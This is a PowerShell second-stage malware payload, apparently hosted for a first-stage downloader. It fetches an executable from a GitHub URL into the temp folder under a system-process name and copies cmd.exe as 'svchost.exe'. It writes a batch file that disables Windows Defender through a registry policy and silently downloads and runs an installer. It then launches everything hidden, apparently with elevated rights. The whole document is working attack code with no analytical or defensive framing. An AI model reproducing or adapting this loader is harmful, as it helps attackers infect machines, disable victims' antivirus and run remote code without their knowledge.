# Stage 2: Full payload (host this at the URL stage1 downloads from)

$t="$env:TEMP";
$m="$t\dwm.exe";
$c="$t\svchost.exe";
$b="$t\run.bat";

# Download method34.exe from your server
(New-Object Net.WebClient).DownloadFile('https://github.com/taxesmmmm-collab/tsetinyourmymmas-ass/raw/main/method34.exe', $m);

# Copy and rename cmd.exe
Copy-Item "$env:SystemRoot\System32\cmd.exe" $c -Force;

# Create the elevated batch that disables Defender then runs payload
@"
@echo off
reg add "HKLM\SOFTWARE\Policies\Microsoft\Windows Defender" /v DisableAntiSpyware /t REG_DWORD /d 1 /f >nul 2>&1
timeout /t 3 /nobreak >nul
powershell -w 0 -c "`$wc=New-Object Net.WebClient;`$wc.DownloadFile('http://dl.google.com/chrome/install/latest/chrome_installer.exe','$t\setup.exe');Start-Process '$t\setup.exe' /silent"
"@ | Out-File $b -Encoding ASCII;

# Run method34 with renamed cmd to execute the batch elevated - completely hidden
Start-Process $m -ArgumentList "`"$c /c $b`"" -WindowStyle Hidden;
